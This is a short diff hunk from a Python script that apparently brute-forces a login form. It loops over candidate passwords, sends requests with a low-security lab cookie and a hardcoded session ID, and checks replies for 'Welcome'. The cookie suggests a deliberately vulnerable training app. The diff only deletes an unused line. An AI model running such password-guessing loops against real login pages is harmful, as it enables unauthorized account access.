@@ -10,7 +10,6 @@ for password in password_str:
     cookie ={"security":"low", "PHPSESSID":"d80lfk4i81thqk2hhbpppl9a3h"}
     # You must get this PHPSESSID from your browser cookie
     req = requests.get(url,params=param,cookies=cookie)
-    req.cookies
     txt = req.text
     print(txt)
     if "Welcome" in txt:
